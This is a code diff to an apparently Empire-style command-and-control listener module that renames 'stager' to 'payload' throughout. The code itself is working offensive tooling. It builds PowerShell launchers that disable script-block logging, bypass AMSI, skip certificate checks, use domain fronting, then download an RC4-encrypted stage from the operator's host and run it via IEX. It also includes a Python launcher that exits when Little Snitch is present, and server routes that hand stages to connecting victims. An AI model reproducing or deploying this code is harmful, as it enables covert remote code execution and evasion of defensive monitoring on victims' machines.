@@ -36,7 +36,7 @@ class Listener:
             'Comments': []
         }
 
-        # any options needed by the stager, settable during runtime
+        # any options needed by the payload, settable during runtime
         self.options = {
             # format:
             #   value_name : {description, required, default_value}
@@ -111,8 +111,8 @@ class Listener:
                 'Required'      :   True,
                 'Value'         :   'Microsoft-IIS/7.5'
             },
-            'StagerURI' : {
-                'Description'   :   'URI for the stager. Must use /download/. Example: /download/stager.php',
+            'payloadURI' : {
+                'Description'   :   'URI for the payload. Must use /download/. Example: /download/payload.php',
                 'Required'      :   False,
                 'Value'         :   ''
             },
@@ -250,7 +250,7 @@ class Listener:
         return True
 
 
-    def generate_launcher(self, encode=True, obfuscate=False, obfuscationCommand="", userAgent='default', proxy='default', proxyCreds='default', stagerRetries='0', language=None, safeChecks='', listenerName=None):
+    def generate_launcher(self, encode=True, obfuscate=False, obfuscationCommand="", userAgent='default', proxy='default', proxyCreds='default', payloadRetries='0', language=None, safeChecks='', listenerName=None):
         """
         Generate a basic launcher for the specified listener.
         """
@@ -273,68 +273,68 @@ class Listener:
             if language.startswith('po'):
                 # PowerShell
 
-                stager = '$ErrorActionPreference = \"SilentlyContinue\";'
+                payload = '$ErrorActionPreference = \"SilentlyContinue\";'
                 if safeChecks.lower() == 'true':
-                    stager = helpers.randomize_capitalization("If($PSVersionTable.PSVersion.Major -ge 3){")
+                    payload = helpers.randomize_capitalization("If($PSVersionTable.PSVersion.Major -ge 3){")
 
                     # ScriptBlock Logging bypass
-                    stager += helpers.randomize_capitalization("$GPF=[ref].Assembly.GetType(")
-                    stager += "'System.Management.Automation.Utils'"
-                    stager += helpers.randomize_capitalization(").\"GetFie`ld\"(")
-                    stager += "'cachedGroupPolicySettings','N'+'onPublic,Static'"
-                    stager += helpers.randomize_capitalization(");If($GPF){$GPC=$GPF.GetValue($null);If($GPC")
-                    stager += "['ScriptB'+'lockLogging']"
-                    stager += helpers.randomize_capitalization("){$GPC")
-                    stager += "['ScriptB'+'lockLogging']['EnableScriptB'+'lockLogging']=0;"
-                    stager += helpers.randomize_capitalization("$GPC")
-                    stager += "['ScriptB'+'lockLogging']['EnableScriptBlockInvocationLogging']=0}"
-                    stager += helpers.randomize_capitalization("$val=[Collections.Generic.Dictionary[string,System.Object]]::new();$val.Add")
-                    stager += "('EnableScriptB'+'lockLogging',0);"
-                    stager += helpers.randomize_capitalization("$val.Add")
-                    stager += "('EnableScriptBlockInvocationLogging',0);"
-                    stager += helpers.randomize_capitalization("$GPC")
-                    stager += "['HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\PowerShell\ScriptB'+'lockLogging']"
-                    stager += helpers.randomize_capitalization("=$val}")
-                    stager += helpers.randomize_capitalization("Else{[ScriptBlock].\"GetFie`ld\"(")
-                    stager += "'signatures','N'+'onPublic,Static'"
-                    stager += helpers.randomize_capitalization(").SetValue($null,(New-Object Collections.Generic.HashSet[string]))}")
+                    payload += helpers.randomize_capitalization("$GPF=[ref].Assembly.GetType(")
+                    payload += "'System.Management.Automation.Utils'"
+                    payload += helpers.randomize_capitalization(").\"GetFie`ld\"(")
+                    payload += "'cachedGroupPolicySettings','N'+'onPublic,Static'"
+                    payload += helpers.randomize_capitalization(");If($GPF){$GPC=$GPF.GetValue($null);If($GPC")
+                    payload += "['ScriptB'+'lockLogging']"
+                    payload += helpers.randomize_capitalization("){$GPC")
+                    payload += "['ScriptB'+'lockLogging']['EnableScriptB'+'lockLogging']=0;"
+                    payload += helpers.randomize_capitalization("$GPC")
+                    payload += "['ScriptB'+'lockLogging']['EnableScriptBlockInvocationLogging']=0}"
+                    payload += helpers.randomize_capitalization("$val=[Collections.Generic.Dictionary[string,System.Object]]::new();$val.Add")
+                    payload += "('EnableScriptB'+'lockLogging',0);"
+                    payload += helpers.randomize_capitalization("$val.Add")
+                    payload += "('EnableScriptBlockInvocationLogging',0);"
+                    payload += helpers.randomize_capitalization("$GPC")
+                    payload += "['HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\PowerShell\ScriptB'+'lockLogging']"
+                    payload += helpers.randomize_capitalization("=$val}")
+                    payload += helpers.randomize_capitalization("Else{[ScriptBlock].\"GetFie`ld\"(")
+                    payload += "'signatures','N'+'onPublic,Static'"
+                    payload += helpers.randomize_capitalization(").SetValue($null,(New-Object Collections.Generic.HashSet[string]))}")
 
                     # @mattifestation's AMSI bypass
-                    stager += helpers.randomize_capitalization("[Ref].Assembly.GetType(")
-                    stager += "'System.Management.Automation.AmsiUtils'"
-                    stager += helpers.randomize_capitalization(')|?{$_}|%{$_.GetField(')
-                    stager += "'amsiInitFailed','NonPublic,Static'"
-                    stager += helpers.randomize_capitalization(").SetValue($null,$true)};")
-                    stager += "};"
-                    stager += helpers.randomize_capitalization("[System.Net.ServicePointManager]::Expect100Continue=0;")
+                    payload += helpers.randomize_capitalization("[Ref].Assembly.GetType(")
+                    payload += "'System.Management.Automation.AmsiUtils'"
+                    payload += helpers.randomize_capitalization(')|?{$_}|%{$_.GetField(')
+                    payload += "'amsiInitFailed','NonPublic,Static'"
+                    payload += helpers.randomize_capitalization(").SetValue($null,$true)};")
+                    payload += "};"
+                    payload += helpers.randomize_capitalization("[System.Net.ServicePointManager]::Expect100Continue=0;")
 
-                stager += helpers.randomize_capitalization("$wc=New-Object System.Net.WebClient;")
+                payload += helpers.randomize_capitalization("$wc=New-Object System.Net.WebClient;")
 
                 if userAgent.lower() == 'default':
                     profile = listenerOptions['DefaultProfile']['Value']
                     userAgent = profile.split('|')[1]
-                stager += "$u='"+userAgent+"';"
+                payload += "$u='"+userAgent+"';"
 
                 if 'https' in host:
                     # allow for self-signed certificates for https connections
-                    stager += "[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true};"
+                    payload += "[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true};"
 
                 if userAgent.lower() != 'none':
-                    stager += helpers.randomize_capitalization('$wc.Headers.Add(')
-                    stager += "'User-Agent',$u);"
+                    payload += helpers.randomize_capitalization('$wc.Headers.Add(')
+                    payload += "'User-Agent',$u);"
 
                 if proxy.lower() != 'none':
                     if proxy.lower() == 'default':
-                        stager += helpers.randomize_capitalization("$wc.Proxy=[System.Net.WebRequest]::DefaultWebProxy;")
+                        payload += helpers.randomize_capitalization("$wc.Proxy=[System.Net.WebRequest]::DefaultWebProxy;")
                     else:
                         # TODO: implement form for other proxy
-                        stager += helpers.randomize_capitalization("$proxy=New-Object Net.WebProxy('")
-                        stager += proxy.lower()
-                        stager += helpers.randomize_capitalization("');")
-                        stager += helpers.randomize_capitalization("$wc.Proxy = $proxy;")
+                        payload += helpers.randomize_capitalization("$proxy=New-Object Net.WebProxy('")
+                        payload += proxy.lower()
+                        payload += helpers.randomize_capitalization("');")
+                        payload += helpers.randomize_capitalization("$wc.Proxy = $proxy;")
                     if proxyCreds.lower() != 'none':
                         if proxyCreds.lower() == "default":
-                            stager += helpers.randomize_capitalization("$wc.Proxy.Credentials = [System.Net.CredentialCache]::DefaultNetworkCredentials;")
+                            payload += helpers.randomize_capitalization("$wc.Proxy.Credentials = [System.Net.CredentialCache]::DefaultNetworkCredentials;")
                         else:
                             # TODO: implement form for other proxy credentials
                             username = proxyCreds.split(':')[0]
@@ -342,17 +342,17 @@ class Listener:
                             if len(username.split('\\')) > 1:
                                 usr = username.split('\\')[1]
                                 domain = username.split('\\')[0]
-                                stager += "$netcred = New-Object System.Net.NetworkCredential('"+usr+"','"+password+"','"+domain+"');"
+                                payload += "$netcred = New-Object System.Net.NetworkCredential('"+usr+"','"+password+"','"+domain+"');"
                             else:
                                 usr = username.split('\\')[0]
-                                stager += "$netcred = New-Object System.Net.NetworkCredential('"+usr+"','"+password+"');"
-                            stager += helpers.randomize_capitalization("$wc.Proxy.Credentials = $netcred;")
+                                payload += "$netcred = New-Object System.Net.NetworkCredential('"+usr+"','"+password+"');"
+                            payload += helpers.randomize_capitalization("$wc.Proxy.Credentials = $netcred;")
                 else:
-                    stager += helpers.randomize_capitalization("$wc.Proxy=[System.Net.GlobalProxySelection]::GetEmptyWebProxy();")
+                    payload += helpers.randomize_capitalization("$wc.Proxy=[System.Net.GlobalProxySelection]::GetEmptyWebProxy();")
                     #save the proxy settings to use during the entire staging process and the agent
-                stager += "$Script:Proxy = $wc.Proxy;"
+                payload += "$Script:Proxy = $wc.Proxy;"
 
-                # TODO: reimplement stager retries?
+                # TODO: reimplement payload retries?
                 #check if we're using IPv6
                 listenerOptions = copy.deepcopy(listenerOptions)
                 bindIP = listenerOptions['BindIP']['Value']
@@ -365,17 +365,17 @@ class Listener:
                             host = 'http://' + '[' + str(bindIP) + ']' + ":" + str(port)
 
                 # code to turn the key string into a byte array
-                stager += helpers.randomize_capitalization("$K=[System.Text.Encoding]::ASCII.GetBytes(")
-                stager += "'%s');" % (stagingKey)
+                payload += helpers.randomize_capitalization("$K=[System.Text.Encoding]::ASCII.GetBytes(")
+                payload += "'%s');" % (stagingKey)
 
-                # this is the minimized RC4 stager code from rc4.ps1
-                stager += helpers.randomize_capitalization('$R={$D,$K=$Args;$S=0..255;0..255|%{$J=($J+$S[$_]+$K[$_%$K.Count])%256;$S[$_],$S[$J]=$S[$J],$S[$_]};$D|%{$I=($I+1)%256;$H=($H+$S[$I])%256;$S[$I],$S[$H]=$S[$H],$S[$I];$_-bxor$S[($S[$I]+$S[$H])%256]}};')
+                # this is the minimized RC4 payload code from rc4.ps1
+                payload += helpers.randomize_capitalization('$R={$D,$K=$Args;$S=0..255;0..255|%{$J=($J+$S[$_]+$K[$_%$K.Count])%256;$S[$_],$S[$J]=$S[$J],$S[$_]};$D|%{$I=($I+1)%256;$H=($H+$S[$I])%256;$S[$I],$S[$H]=$S[$H],$S[$I];$_-bxor$S[($S[$I]+$S[$H])%256]}};')
 
                 # prebuild the request routing packet for the launcher
                 routingPacket = packets.build_routing_packet(stagingKey, sessionID='00000000', language='POWERSHELL', meta='STAGE0', additional='None', encData='')
                 b64RoutingPacket = base64.b64encode(routingPacket)
 
-                stager += "$ser='%s';$t='%s';" % (host, stage0)
+                payload += "$ser='%s';$t='%s';" % (host, stage0)
                 #Add custom headers if any
                 if customHeaders != []:
                     for header in customHeaders:
@@ -384,31 +384,31 @@ class Listener:
                         #If host header defined, assume domain fronting is in use and add a call to the base URL first
                         #this is a trick to keep the true host name from showing in the TLS SNI portion of the client hello
                         if headerKey.lower() == "host":
-                            stager += helpers.randomize_capitalization("try{$ig=$WC.DownloadData($ser)}catch{};")
+                            payload += helpers.randomize_capitalization("try{$ig=$WC.DownloadData($ser)}catch{};")
 
-                        stager += helpers.randomize_capitalization("$wc.Headers.Add(")
-                        stager += "\"%s\",\"%s\");" % (headerKey, headerValue)
+                        payload += helpers.randomize_capitalization("$wc.Headers.Add(")
+                        payload += "\"%s\",\"%s\");" % (headerKey, headerValue)
 
                 # add the RC4 packet to a cookie
 
-                stager += helpers.randomize_capitalization("$wc.Headers.Add(")
-                stager += "\"Cookie\",\"session=%s\");" % (b64RoutingPacket)
+                payload += helpers.randomize_capitalization("$wc.Headers.Add(")
+                payload += "\"Cookie\",\"session=%s\");" % (b64RoutingPacket)
 
 
-                stager += helpers.randomize_capitalization("$data=$WC.DownloadData($ser+$t);")
-                stager += helpers.randomize_capitalization("$iv=$data[0..3];$data=$data[4..$data.length];")
+                payload += helpers.randomize_capitalization("$data=$WC.DownloadData($ser+$t);")
+                payload += helpers.randomize_capitalization("$iv=$data[0..3];$data=$data[4..$data.length];")
 
                 # decode everything and kick it over to IEX to kick off execution
-                stager += helpers.randomize_capitalization("-join[Char[]](& $R $data ($IV+$K))|IEX")
+                payload += helpers.randomize_capitalization("-join[Char[]](& $R $data ($IV+$K))|IEX")
 
                 if obfuscate:
-                    stager = helpers.obfuscate(self.mainMenu.installPath, stager, obfuscationCommand=obfuscationCommand)
-                # base64 encode the stager and return it
+                    payload = helpers.obfuscate(self.mainMenu.installPath, payload, obfuscationCommand=obfuscationCommand)
+                # base64 encode the payload and return it
                 if encode and ((not obfuscate) or ("launcher" not in obfuscationCommand.lower())):
-                    return helpers.powershell_launcher(stager, launcher)
+                    return helpers.powershell_launcher(payload, launcher)
                 else:
-                    # otherwise return the case-randomized stager
-                    return stager
+                    # otherwise return the case-randomized payload
+                    return payload
 
             if language.startswith('py'):
                 # Python
@@ -428,7 +428,7 @@ class Listener:
                         launcherBase += "if re.search(\"Little Snitch\", out):\n"
                         launcherBase += "   sys.exit()\n"
                 except Exception as e:
-                    p = "[!] Error setting LittleSnitch in stager: " + str(e)
+                    p = "[!] Error setting LittleSnitch in payload: " + str(e)
                     print helpers.color(p, color='red')
 
                 if userAgent.lower() == 'default':
@@ -481,7 +481,7 @@ class Listener:
                 #install proxy and creds globally, so they can be used with urlopen.
                 launcherBase += "urllib2.install_opener(o);\n"
 
-                # download the stager and extract the IV
+                # download the payload and extract the IV
 
                 launcherBase += "a=urllib2.urlopen(req).read();\n"
                 launcherBase += "IV=a[0:4];"
@@ -515,13 +515,13 @@ class Listener:
             print helpers.color("[!] listeners/http generate_launcher(): invalid listener name specification!")
 
 
-    def generate_stager(self, listenerOptions, encode=False, encrypt=True, obfuscate=False, obfuscationCommand="", language=None):
+    def generate_payload(self, listenerOptions, encode=False, encrypt=True, obfuscate=False, obfuscationCommand="", language=None):
         """
-        Generate the stager code needed for communications with this listener.
+        Generate the payload code needed for communications with this listener.
         """
 
         if not language:
-            print helpers.color('[!] listeners/http generate_stager(): no language specified!')
+            print helpers.color('[!] listeners/http generate_payload(): no language specified!')
             return None
 
 
@@ -540,9 +540,9 @@ class Listener:
 
         if language.lower() == 'powershell':
 
-            # read in the stager base
-            f = open("%s/data/agent/stagers/http.ps1" % (self.mainMenu.installPath))
-            stager = f.read()
+            # read in the payload base
+            f = open("%s/data/agent/payloads/http.ps1" % (self.mainMenu.installPath))
+            payload = f.read()
             f.close()
 
             # make sure the server ends with "/"
@@ -552,50 +552,50 @@ class Listener:
             #Patch in custom Headers
             if customHeaders != []:
                 headers = ','.join(customHeaders)
-                stager = stager.replace("$customHeaders = \"\";","$customHeaders = \""+headers+"\";")
+                payload = payload.replace("$customHeaders = \"\";","$customHeaders = \""+headers+"\";")
 
             #patch in working hours, if any
             if workingHours != "":
-                stager = stager.replace('WORKING_HOURS_REPLACE', workingHours)
+                payload = payload.replace('WORKING_HOURS_REPLACE', workingHours)
 
             #Patch in the killdate, if any
             if killDate != "":
-                stager = stager.replace('REPLACE_KILLDATE', killDate)
+                payload = payload.replace('REPLACE_KILLDATE', killDate)
 
             # patch the server and key information
-            stager = stager.replace('REPLACE_SERVER', host)
-            stager = stager.replace('REPLACE_STAGING_KEY', stagingKey)
-            stager = stager.replace('index.jsp', stage1)
-            stager = stager.replace('index.php', stage2)
+            payload = payload.replace('REPLACE_SERVER', host)
+            payload = payload.replace('REPLACE_STAGING_KEY', stagingKey)
+            payload = payload.replace('index.jsp', stage1)
+            payload = payload.replace('index.php', stage2)
 
-            randomizedStager = ''
+            randomizedpayload = ''
 
-            for line in stager.split("\n"):
+            for line in payload.split("\n"):
                 line = line.strip()
                 # skip commented line
                 if not line.startswith("#"):
                     # randomize capitalization of lines without quoted strings
                     if "\"" not in line:
-                        randomizedStager += helpers.randomize_capitalization(line)
+                        randomizedpayload += helpers.randomize_capitalization(line)
                     else:
-                        randomizedStager += line
+                        randomizedpayload += line
 
             if obfuscate:
-                randomizedStager = helpers.obfuscate(self.mainMenu.installPath, randomizedStager, obfuscationCommand=obfuscationCommand)
-            # base64 encode the stager and return it
+                randomizedpayload = helpers.obfuscate(self.mainMenu.installPath, randomizedpayload, obfuscationCommand=obfuscationCommand)
+            # base64 encode the payload and return it
             if encode:
-                return helpers.enc_powershell(randomizedStager)
+                return helpers.enc_powershell(randomizedpayload)
             elif encrypt:
                 RC4IV = os.urandom(4)
-                return RC4IV + encryption.rc4(RC4IV+stagingKey, randomizedStager)
+                return RC4IV + encryption.rc4(RC4IV+stagingKey, randomizedpayload)
             else:
-                # otherwise just return the case-randomized stager
-                return randomizedStager
+                # otherwise just return the case-randomized payload
+                return randomizedpayload
 
         elif language.lower() == 'python':
             template_path = [
-                os.path.join(self.mainMenu.installPath, '/data/agent/stagers'),
-                os.path.join(self.mainMenu.installPath, './data/agent/stagers')]
+                os.path.join(self.mainMenu.installPath, '/data/agent/payloads'),
+                os.path.join(self.mainMenu.installPath, './data/agent/payloads')]
             eng = templating.TemplateEngine(template_path)
             template = eng.get_template('http.py')
 
@@ -608,22 +608,22 @@ class Listener:
                     'stage_2': stage2
                     }
 
-            stager = template.render(template_options)
-            stager = obfuscation.py_minify(stager)
+            payload = template.render(template_options)
+            payload = obfuscation.py_minify(payload)
 
-            # base64 encode the stager and return it
+            # base64 encode the payload and return it
             if encode:
-                return base64.b64encode(stager)
+                return base64.b64encode(payload)
             if encrypt:
-                # return an encrypted version of the stager ("normal" staging)
+                # return an encrypted version of the payload ("normal" staging)
                 RC4IV = os.urandom(4)
-                return RC4IV + encryption.rc4(RC4IV+stagingKey, stager)
+                return RC4IV + encryption.rc4(RC4IV+stagingKey, payload)
             else:
-                # otherwise return the standard stager
-                return stager
+                # otherwise return the standard payload
+                return payload
 
         else:
-            print helpers.color("[!] listeners/http generate_stager(): invalid language specification, only 'powershell' and 'python' are currently supported for this module.")
+            print helpers.color("[!] listeners/http generate_payload(): invalid language specification, only 'powershell' and 'python' are currently supported for this module.")
 
 
     def generate_agent(self, listenerOptions, language=None, obfuscate=False, obfuscationCommand=""):
@@ -825,7 +825,7 @@ def send_message(packets=None):
     data = None
     if packets:
         data = ''.join(packets)
-        # aes_encrypt_then_hmac is in stager.py
+        # aes_encrypt_then_hmac is in payload.py
         encData = aes_encrypt_then_hmac(key, data)
         data = build_routing_packet(stagingKey, sessionID, meta=5, encData=encData)
     else:
@@ -871,7 +871,7 @@ def send_message(packets=None):
         Threaded function that actually starts up the Flask server.
         """
 
-        # make a copy of the currently set listener options for later stager/agent generation
+        # make a copy of the currently set listener options for later payload/agent generation
         listenerOptions = copy.deepcopy(listenerOptions)
 
         # suppress the normal Flask output
@@ -882,7 +882,7 @@ def send_message(packets=None):
         host = listenerOptions['Host']['Value']
         port = listenerOptions['Port']['Value']
         stagingKey = listenerOptions['StagingKey']['Value']
-        stagerURI = listenerOptions['StagerURI']['Value']
+        payloadURI = listenerOptions['payloadURI']['Value']
         userAgent = self.options['UserAgent']['Value']
         listenerName = self.options['Name']['Value']
         proxy = self.options['Proxy']['Value']
@@ -892,13 +892,13 @@ def send_message(packets=None):
         self.app = app
 
 
-        @app.route('/download/<stager>')
-        def send_stager(stager):
-            if 'po' in stager:
-                launcher = self.mainMenu.stagers.generate_launcher(listenerName, language='powershell', encode=False, userAgent=userAgent, proxy=proxy, proxyCreds=proxyCreds)
+        @app.route('/download/<payload>')
+        def send_payload(payload):
+            if 'po' in payload:
+                launcher = self.mainMenu.payloads.generate_launcher(listenerName, language='powershell', encode=False, userAgent=userAgent, proxy=proxy, proxyCreds=proxyCreds)
                 return launcher
-            elif 'py' in stager:
-                launcher = self.mainMenu.stagers.generate_launcher(listenerName, language='python', encode=False, userAgent=userAgent, proxy=proxy, proxyCreds=proxyCreds)
+            elif 'py' in payload:
+                launcher = self.mainMenu.payloads.generate_launcher(listenerName, language='python', encode=False, userAgent=userAgent, proxy=proxy, proxyCreds=proxyCreds)
                 return launcher
             else:
                 return make_response(self.default_response(), 404)
@@ -1003,17 +1003,17 @@ def send_message(packets=None):
                     for (language, results) in dataResults:
                         if results:
                             if results == 'STAGE0':
-                                # handle_agent_data() signals that the listener should return the stager.ps1 code
+                                # handle_agent_data() signals that the listener should return the payload.ps1 code
 
-                                # step 2 of negotiation -> return stager.ps1 (stage 1)
+                                # step 2 of negotiation -> return payload.ps1 (stage 1)
                                 listenerName = self.options['Name']['Value']
-                                message = "[*] Sending {} stager (stage 1) to {}".format(language, clientIP)
+                                message = "[*] Sending {} payload (stage 1) to {}".format(language, clientIP)
                                 signal = json.dumps({
                                     'print': True,
                                     'message': message
                                 })
                                 dispatcher.send(signal, sender="listeners/http/{}".format(listenerName))
-                                stage = self.generate_stager(language=language, listenerOptions=listenerOptions, obfuscate=self.mainMenu.obfuscate, obfuscationCommand=self.mainMenu.obfuscateCommand)
+                                stage = self.generate_payload(language=language, listenerOptions=listenerOptions, obfuscate=self.mainMenu.obfuscate, obfuscationCommand=self.mainMenu.obfuscateCommand)
                                 return make_response(stage, 200)
 
                             elif results.startswith('ERROR:'):
